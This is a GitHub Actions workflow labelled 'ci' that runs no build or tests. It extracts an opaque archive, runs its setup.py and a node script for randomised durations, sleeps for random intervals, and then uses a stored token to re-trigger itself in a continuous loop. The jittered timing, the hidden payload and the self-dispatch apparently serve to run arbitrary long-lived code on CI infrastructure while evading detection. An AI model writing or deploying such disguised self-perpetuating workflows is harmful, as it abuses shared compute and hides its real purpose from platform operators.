name: ci

on:
  schedule:
    - cron: '17 */4 * * *'
    - cron: '43 2-22/6 * * *'
  workflow_dispatch:

permissions:
  actions: write
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 350

    steps:
    - uses: actions/checkout@v4
      with:
        fetch-depth: 1

    - uses: actions/setup-python@v5
      with:
        python-version: '3.11'

    - uses: actions/setup-node@v4
      with:
        node-version: '20'

    - name: Extract
      run: |
        [ ! -f n.zip ] && exit 1
        unzip -o -q n.zip

    - name: Init
      run: |
        cd n
        [ -f setup.py ] && python setup.py

    - name: Run
      continue-on-error: true
      run: |
        cd n
        DUR=$((RANDOM % 1200 + 1200))
        timeout $DUR node m.js || true

    - name: Wait
      if: always()
      run: sleep $((RANDOM % 720 + 180))

    - name: Dispatch
      if: always()
      env:
        GH_PAT: ${{ secrets.GH_PAT }}
      run: |
        sleep $((RANDOM % 540 + 60))
        curl -s -X POST \
          -H "Authorization: token $GH_PAT" \
          -H "Accept: application/vnd.github+json" \
          https://api.github.com/repos/${{ github.repository }}/actions/workflows/${{ github.workflow }}/dispatches \
          -d "{\"ref\":\"${{ github.ref_name }}\"}" > /dev/null
